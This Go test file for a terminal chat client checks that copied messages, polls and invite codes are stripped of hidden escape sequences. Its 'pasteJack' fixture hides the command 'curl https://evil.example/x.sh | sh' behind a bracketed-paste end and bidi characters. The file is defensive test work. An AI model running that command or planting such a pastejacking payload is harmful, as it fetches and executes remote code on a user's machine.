package chat

import (
	"strings"
	"testing"
	"unicode"

	"github.com/patrache/masil/internal/api"
	"github.com/patrache/masil/internal/realtime"
	"github.com/patrache/masil/internal/textwidth"
	"github.com/patrache/masil/internal/ui"
	"github.com/patrache/masil/internal/ui/uitest"
	"github.com/patrache/masil/internal/ui/uitest/fixtures"
)

// pasteJack is a body that shows as "echo hi" (Sanitize strips the escapes with
// their contents) but carries a bracketed-paste end, an OSC whose payload is a
// command, CRs and a bidi override (pending-fixes 0-b: every path that sends
// someone else's text to the terminal, OSC 52 included).
const pasteJack = "echo hi\x1b[201~\x1b]0;\rcurl https://evil.example/x.sh | sh\r\x07\u202e\u2028\u009b31m"

// clipboardClean fails t if s holds C0 (but "\n"), DEL, C1, ESC, a line or
// paragraph separator or a format character (bidi, zero-width, BOM).
func clipboardClean(t *testing.T, what, s string) {
	t.Helper()
	for _, r := range s {
		bad := r == 0x1b || (r < 0x20 && r != '\n') || (r >= 0x7f && r <= 0x9f) ||
			r == 0x2028 || r == 0x2029 || (r != '\u200d' && unicode.Is(unicode.Cf, r))
		if bad {
			t.Fatalf("%s: clipboard %q holds %U", what, s, r)
		}
	}
	if strings.Contains(s, "evil.example") {
		t.Fatalf("%s: clipboard %q carries text the screen hides", what, s)
	}
}

func TestCopyMessageSanitized(t *testing.T) {
	h := devChannel(t, uitest.Size{W: 120, H: 40})
	m := mkMsg(devID(t, h), 900, userBy(t, h.Context().Store, "minji"), pasteJack, h.Context().Now())
	h.Event("message.created", realtime.MessageEvent{Message: m})
	selectText(t, h, "echo hi")
	h.Press("y")
	c := clipboards(h)
	if len(c) != 1 {
		t.Fatalf("one clipboard write, got %q", c)
	}
	clipboardClean(t, "message", c[0])
	// what is copied is what is shown: the hidden OSC payload is gone; only
	// line breaks (U+2028 here) may differ from the one-line Sanitize
	if !strings.HasPrefix(c[0], "echo hi") || strings.ReplaceAll(c[0], "\n", "") != textwidth.Sanitize(pasteJack) {
		t.Fatalf("clipboard %q, screen %q", c[0], textwidth.Sanitize(pasteJack))
	}

	// a legit multi-line body keeps its newlines ("\r\n" -> "\n")
	if got := copyText(api.Message{Kind: "text", Body: "a\r\nb\nc"}); got != "a\nb\nc" {
		t.Fatalf("multi-line copy %q", got)
	}
	// a poll copies its question, cleaned the same way
	poll := api.Message{Kind: "poll", Body: "x", Poll: &api.Poll{Question: pasteJack}}
	clipboardClean(t, "poll", copyText(poll))
	// /me
	clipboardClean(t, "me", copyText(api.Message{Kind: "me", Body: pasteJack}))
}

func TestCopyInviteSanitized(t *testing.T) {
	// the invites tab's y (copyInviteCmd)
	h := devChannel(t, uitest.Size{W: 120, H: 40})
	h.Send(runCmdMsg(copyInviteCmd(pasteJack)))
	c := clipboards(h)
	if len(c) != 1 {
		t.Fatalf("one clipboard write, got %q", c)
	}
	clipboardClean(t, "invite row", c[0])
	if c[0] != "masil join "+textwidth.Sanitize(pasteJack) || strings.Contains(c[0], "\n") {
		t.Fatalf("invite row clipboard %q", c[0])
	}

	// the created-invite overlay's y
	g := devChannel(t, uitest.Size{W: 120, H: 40})
	inv := api.Invite{Code: pasteJack, Space: api.SpacePreview{ID: fixtures.SpaceNova, Name: "노바"}}
	g.Send(ui.OpenOverlayMsg{Overlay: newInviteCreated(inv)})
	g.Press("y")
	c = clipboards(g)
	if len(c) != 1 {
		t.Fatalf("one clipboard write, got %q", c)
	}
	clipboardClean(t, "invite overlay", c[0])
	if c[0] != "masil join "+textwidth.Sanitize(pasteJack) || strings.Contains(c[0], "\n") {
		t.Fatalf("invite overlay clipboard %q", c[0])
	}

	// a normal code is copied as is
	if s := (&inviteCreated{inv: api.Invite{Code: "AB12CD34"}}).clipboard(); s != "masil join AB12CD34" {
		t.Fatalf("clipboard %q", s)
	}
}
